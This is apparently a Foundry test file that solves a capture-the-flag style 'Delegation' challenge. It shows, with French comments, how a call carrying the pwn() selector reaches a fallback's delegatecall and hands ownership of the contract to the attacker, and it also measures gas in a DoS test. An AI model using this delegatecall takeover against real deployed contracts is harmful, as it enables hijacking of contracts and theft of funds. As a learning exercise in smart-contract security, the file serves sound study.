// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "../src/Delegate.sol";

contract TestDelegate is Test {
    Delegate delegate;
    Delegation delegation;
    DoS dos;
    address alice;
    uint256 alicePrivKey;
    //I must take the ownership of delegate with bob address
    address bob = makeAddr("bob");

    function setUp() public {
        (alice, alicePrivKey) = makeAddrAndKey("alice");
        delegate = new Delegate(alice);
        delegation = new Delegation(address(delegate));
        dos = new DoS();
        console.log("delegation owner is ", delegation.owner());
        console.log("delegate owner is ", delegate.owner());
    }

    function test_take_the_ownership() public {
        bytes memory delegatePwn = abi.encodeWithSignature("pwn()");
        vm.prank(bob);
        //call retourne toujours true si dans le contract il ya un fallback ou un receive
        //en fonction de si tu passes des données ou non a call
        //Ici j'ai passé delegatePwn qui correspond au selecteur de la fonction pwn
        //comme c'est un transfert d'ethers avec des données alors fallback sera appelé
        //s'il n'yavait pas de données par exemple address(delegation).call{value: 0 ether}("");
        //alors c'est receive qui allait être appelé
        (bool success, ) = address(delegation).call{value: 0 ether}(
            delegatePwn
        );
        console.log("return call is ", success);
        console.log("delegation owner is now ", delegation.owner());
        console.log("delegate owner is ", delegate.owner());
        console.log("delegation address is ", address(delegation));
    }

    function test_DoS() public {
        vm.txGasPrice(1);
        uint256 gasBefore = gasleft();
        for (uint256 i = 0; i < 100; i++) {
            (bool result, ) = address(dos).call("test");
            console.log("result is ", result);
        }
        uint256 gasConsumed = (gasBefore - gasleft()) * tx.gasprice;
        console.log("Gas consumed is ", gasConsumed);
        uint gasBeforeTest = gasleft();

        uint256 gasConsumedByTestEntering = (gasBeforeTest - gasleft()) *
            tx.gasprice;
        console.log(
            "Gas consumed by executing test function is ",
            gasConsumedByTestEntering
        );
    }
}
